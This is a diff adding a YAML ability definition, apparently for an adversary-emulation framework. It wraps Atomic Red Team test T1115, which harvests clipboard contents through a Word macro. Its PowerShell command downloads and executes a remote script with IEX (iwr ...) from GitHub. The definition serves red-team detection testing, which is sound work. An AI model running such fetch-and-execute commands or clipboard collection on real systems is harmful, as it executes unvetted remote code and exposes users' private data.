@@ -1,0 +1,25 @@
+---
+- id: abd5327a47c4994e2824f833eefe4250
+  name: Collect Clipboard Data via VBA
+  description: 'This module copies the data stored in the user''s clipboard and writes
+    it to a file, $env:TEMP\atomic_T1115_clipboard_data.txt
+
+    '
+  tactic: collection
+  technique:
+    attack_id: T1115
+    name: Clipboard Data
+  platforms:
+    windows:
+      psh:
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          Set-Clipboard -value "Atomic T1115 Test, grab data from clipboard via VBA";
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"
+          -UseBasicParsing); Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1115\src\T1115-macrocode.txt"
+          -officeProduct "Word" -sub "GetClipboard"'
+        payloads: []
+        cleanup: Remove-Item "$env:TEMP\atomic_T1115_clipboard_data.txt" -ErrorAction
+          Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
